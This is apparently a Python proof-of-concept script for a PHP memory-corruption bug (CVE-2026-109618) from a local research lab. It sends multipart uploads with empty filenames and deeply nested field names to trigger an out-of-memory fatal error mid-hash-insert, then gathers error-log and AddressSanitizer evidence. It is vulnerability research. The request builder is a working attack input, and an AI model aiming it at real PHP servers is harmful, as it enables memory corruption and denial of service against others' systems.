#!/usr/bin/env python3
"""PoC runner: CVE-2026-109618 Path A, partially initialized HashTable bucket
(Calif; local lab only).

WHAT THIS PROVES
  A multipart body of filename="" empty uploads with nested field names
  amplifies parser-side hash allocations far beyond the request size (each
  empty file skips the temp-file path, so max_file_uploads is not consumed —
  rfc1867.c:987/1007 — while all six $_FILES entries are still registered with
  nested keys). Sweeping memory_limit lets the fatal land inside
  _zend_hash_str_add_or_update_i AFTER nNumUsed++/nNumOfElements++ but BEFORE
  the key zend_string_init returns (zend_hash.c:955-958, 8.4.4), leaving a
  bucket that teardown (zend_array_destroy up to nNumUsed) treats as valid.

WHAT THIS DOES NOT DO
  No heap grooming, no pointer/address control, no code execution attempt.
  Observation stops at the memory error / malformed-bucket consumption.

Usage (Apache lab must be running, started by apache-patha-sweep.sh):
  POC_* env vars + python3 linux/poc-patha.py --parts 1000 --nest 30
"""
import argparse
import json
import os
import re
import secrets
import socket
import sys
import time
from pathlib import Path

BASE = Path('/home/phplab/php-lab')
PORT = 18088


def build_body(parts, nest, boundary, shared_chain=False, leaf_pad=0, seg_pad=0,
               real_files=False):
    head = []
    suffix = ''.join('[s%d%s]' % (i, 'S' * seg_pad) for i in range(nest))
    pad = 'P' * leaf_pad
    content = b'Z' * 8
    for i in range(parts):
        if shared_chain:
            name = 'g%s[k%04d%s]' % (suffix, i, pad)
        else:
            name = 'f[%d]%s' % (i, suffix)
        filename = 'a.bin' if real_files else ''
        head.append(
            ('--%s\r\nContent-Disposition: form-data; name="%s"; '
             'filename="%s"\r\nContent-Type: application/octet-stream\r\n\r\n'
             % (boundary, name, filename)).encode()
            + (content if real_files else b'') + b'\r\n')
    head.append(('--%s--\r\n' % boundary).encode())
    body = b''.join(head)
    return body


def send_request(port, body, boundary, timeout=90):
    head = ('POST /upload HTTP/1.1\r\nHost: 127.0.0.1\r\n'
            'Content-Type: multipart/form-data; boundary=%s\r\n'
            'Content-Length: %d\r\nConnection: close\r\n\r\n'
            % (boundary, len(body)))
    started = time.time()
    status = None
    reset = False
    try:
        sock = socket.create_connection(('127.0.0.1', port), timeout=timeout)
        sock.settimeout(timeout)
        sock.sendall(head.encode() + body)
        chunks = []
        try:
            while True:
                data = sock.recv(65536)
                if not data:
                    break
                chunks.append(data)
        except (ConnectionResetError, BrokenPipeError, OSError):
            reset = True
        raw = b''.join(chunks)
        match = re.match(rb'HTTP/1\.[01] (\d+)', raw)
        if match:
            status = int(match.group(1))
    except (ConnectionResetError, BrokenPipeError, OSError):
        reset = True
    return dict(status=status, connection_reset=reset,
                elapsed=round(time.time() - started, 2), response_head=raw[:160].decode('latin1', 'replace'))


def process_alive(pid):
    try:
        os.kill(pid, 0)
        return True
    except OSError:
        return False


def parse_asan(path):
    text = Path(path).read_text(errors='replace')
    if 'AddressSanitizer' not in text:
        return None
    frames = [line.strip() for line in text.splitlines() if re.match(r'\s*#\d+', line)]
    return dict(file=str(path), kind=('heap-use-after-free' if 'heap-use-after-free' in text
                                      else 'other'), first_frames=frames[:6],
                summary=next((line for line in text.splitlines() if 'SUMMARY' in line), ''))


def classify_site(site):
    """Bucket the 'exhausted at <file>:<line>' allocation site."""
    if not site:
        return None
    if 'zend_hash.c' in site:
        line = int(re.search(r':(\d+)', site).group(1))
        if 940 <= line <= 975:
            return 'hash_add_or_update_body'  # key init / bucket write region
        if 'zend_hash_do_resize' in site or 1150 <= line <= 1250:
            return 'hash_resize'
        return 'zend_hash_other'
    if 'zend_string' in site:
        return 'zend_string_alloc'
    if 'rfc1867' in site:
        return 'rffc1867_parser'
    if 'php_variables' in site:
        return 'php_variables'
    if 'zend_alloc' in site:
        return 'zend_alloc'
    return 'other'


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--version', default='8.4.4')
    parser.add_argument('--port', type=int, default=PORT)
    parser.add_argument('--parts', type=int, default=1000)
    parser.add_argument('--nest', type=int, default=30)
    parser.add_argument('--shared-chain', action='store_true',
                        help='one deep name chain shared across parts; parts '
                             'differ at a string leaf key only')
    parser.add_argument('--leaf-pad', type=int, default=0,
                        help='pad the shared-chain leaf key to steer the '
                             'crossing onto the key allocation')
    parser.add_argument('--seg-pad', type=int, default=0,
                        help='pad every nested name segment so key string '
                             'allocations dominate the crossing probability')
    parser.add_argument('--real-files', action='store_true',
                        help='real file parts (temp file + uploaded_files '
                             'insert) instead of empty filename="" parts')
    args = parser.parse_args()

    label = 'limit%s-parts%d-nest%d%s%s' % (
        os.environ.get('POC_MEMORY_LIMIT', 'default'), args.parts, args.nest,
        '-shared' if args.shared_chain else '',
        '-segpad%d' % args.seg_pad if args.seg_pad else '')
    out = Path(os.environ.get('POC_OUT_DIR') or BASE / 'evidence' / 'poc-patha')
    out.mkdir(parents=True, exist_ok=True)
    error_log = Path(os.environ.get('POC_ERROR_LOG', out / 'php-error.log'))
    asan_dir = Path(os.environ.get('POC_ASAN_DIR', out))
    worker_pid = int(os.environ['POC_PROCESS_PID']) if os.environ.get('POC_PROCESS_PID') else None

    asan_before = {p.name for p in asan_dir.glob('asan.*') if p.is_file()}
    log_before = error_log.stat().st_size if error_log.exists() else 0

    boundary = 'PathABnd' + secrets.token_hex(8)
    body = build_body(args.parts, args.nest, boundary,
                      shared_chain=args.shared_chain, leaf_pad=args.leaf_pad,
                      seg_pad=args.seg_pad, real_files=args.real_files)
    result = dict(label=label, version=args.version, parts=args.parts,
                  nest=args.nest,
                  memory_limit=os.environ.get('POC_MEMORY_LIMIT', 'ini-default'),
                  body_bytes=len(body),
                  amplification=(os.environ.get('POC_MEMORY_LIMIT_BYTES') and
                                 int(os.environ.get('POC_MEMORY_LIMIT_BYTES')) // max(len(body), 1)),
                  worker_pid=worker_pid)
    response = send_request(args.port, body, boundary)
    time.sleep(1.0)
    result.update(response)

    log_text = ''
    if error_log.exists():
        with error_log.open('rb') as handle:
            handle.seek(log_before)
            log_text = handle.read().decode('utf-8', 'replace')
    fatal = re.search(r'Allowed memory size of (\d+) bytes exhausted at ([^\s]+) '
                      r'\(tried to allocate (\d+) bytes\)', log_text)
    parts_limit = 'Multipart body parts limit' in log_text
    result.update(oom_logged=bool(fatal), multipart_parts_limit=parts_limit)
    if fatal:
        result.update(oom_limit_bytes=int(fatal.group(1)),
                      oom_site=fatal.group(2),
                      oom_tried_bytes=int(fatal.group(3)),
                      oom_site_class=classify_site(fatal.group(2)))

    new_asan = []
    for path in sorted(asan_dir.glob('asan.*')):
        if path.name in asan_before or not path.is_file():
            continue
        parsed = parse_asan(path)
        if parsed:
            new_asan.append(parsed)
    result.update(asan_reports=new_asan,
                  worker_alive_after=(process_alive(worker_pid) if worker_pid else None))
    result['verdict'] = (
        'fatal_and_teardown_memory_error' if fatal and new_asan else
        'fatal_only' if fatal else
        'parts_limit' if parts_limit else 'no_fatal')
    (out / ('result-%s.json' % label)).write_text(json.dumps(result, indent=2))
    print(json.dumps({k: result[k] for k in ('label', 'body_bytes', 'status',
                                             'connection_reset', 'oom_logged',
                                             'oom_site_class', 'oom_site',
                                             'worker_alive_after', 'verdict')}, ))


if __name__ == '__main__':
    sys.exit(main())
